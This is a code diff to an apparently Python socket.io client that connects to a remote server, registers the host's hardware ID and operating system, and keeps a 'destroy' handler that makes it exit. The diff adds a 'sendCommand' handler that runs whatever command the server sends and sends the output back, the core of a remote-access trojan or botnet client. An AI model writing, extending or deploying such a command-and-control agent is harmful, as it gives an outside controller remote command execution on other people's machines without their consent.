@@ -21,11 +21,6 @@ def connect_to_server():
     sio.connect(SERVER_URL)
     sio.wait()
 
-@sio.on('destroy')
-def destroy_connection():
-    sio.disconnect()
-    sys.exit(0)
-
 def register_client():
     client_info = {
         'hwid': get_hwid(),
@@ -33,3 +28,14 @@ def register_client():
         'os': get_os()
     }
     sio.emit("register", client_info)
+
+@sio.on('destroy')
+def destroy_connection():
+    sio.disconnect()
+    sys.exit(0)
+
+@sio.on('sendCommand')
+def handle_command(command):
+    print(f"[*] Received command: {command}")
+    response = run_command(command)
+    sio.emit("commandResponse", response)
